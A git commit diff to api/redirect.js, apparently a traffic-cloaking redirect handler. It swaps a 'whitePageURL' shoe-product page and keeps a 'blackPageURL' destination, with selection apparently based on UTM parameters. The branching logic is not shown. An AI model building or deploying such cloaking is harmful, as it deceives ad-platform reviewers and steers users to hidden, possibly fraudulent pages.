36e9deb8926f53e838e46614c25ce5df5ea70ad8
Ahmadfarhan67 <123234895+Ahmadfarhan67@users.noreply.github.com>
2025-10-23 16:36:58 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://zippyonline.com/products/zy-superlight-runner-combined-trainers-for-boys-green-blue";
+    const whitePageURL = "https://www.nextdirect.com/dk/en/style/su406826/e53225";
     const blackPageURL = "https://nowhereher.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
